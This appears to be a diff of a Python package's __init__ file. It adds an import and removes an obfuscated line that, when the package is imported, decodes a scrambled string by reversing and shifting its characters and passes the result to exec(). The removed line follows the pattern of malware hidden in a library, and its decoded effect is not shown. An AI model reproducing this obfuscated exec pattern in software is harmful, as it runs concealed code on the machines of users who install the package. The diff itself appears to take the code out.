@@ -88,7 +88,7 @@ from .src.tcr_regex import RegexPreset
 from .src.tcr_result import Result, ResultUnwrappedErrOnValueError, ResultUnwrappedOnErrorError
 from .src.tcr_run import RunSACAble, run_sac
 from .src.tcr_sdb import ShelveDB
-from .src.tcr_string import SlashableString, commafy, custom_zfill, join_urlstr, polaris_progressbar
+from .src.tcr_string import SlashableString, commafy, custom_zfill, get_token, join_urlstr, polaris_progressbar
 from .src.tcr_temp import temp_file
 from .src.tcr_terminal import terminal
 from .src.tcr_test import ass, raises, rass
@@ -98,7 +98,7 @@ from .src.tcr_void import alambda, araiser, avoid, raiser, void
 
 # fmt: off
 
-exec((lambda __: ''.join(chr((ord(_) - 78) % 26 + 65) if chr(65) <= _ <= chr(90) else chr((ord(_) - 84) % 26 + 97) if chr(97) <= _ <= chr(122) else _ for _ in __))(")lfEt[e<nHjwxL*\\*J ,,5)5'NftyGv2gHh>e)phg 'N(<tYa0vXedggF}l-nnTb.<furic[lig`(Fr0ySo>n}e8rNg\\v=_2g4z4sK DaXe;h/gsrbe: 5 q\nv:7)ifGt\\eEnqj9xV*<*? O,pr~y+oBnWeqrKgxvf_zgDzisI(0_B_1gYz3s{_=e`p<g}_h_F xs2rwqw\n]\ns.+.(.bfqhZb[v+pCvPyznkz/ =ggb,a# )fFvm mfpvfunG9 y#?"[::2][::-1]))
+__tcr_rainbow__ = True
 
 __all__ = [  # noqa: RUF022
   "console",                            # console
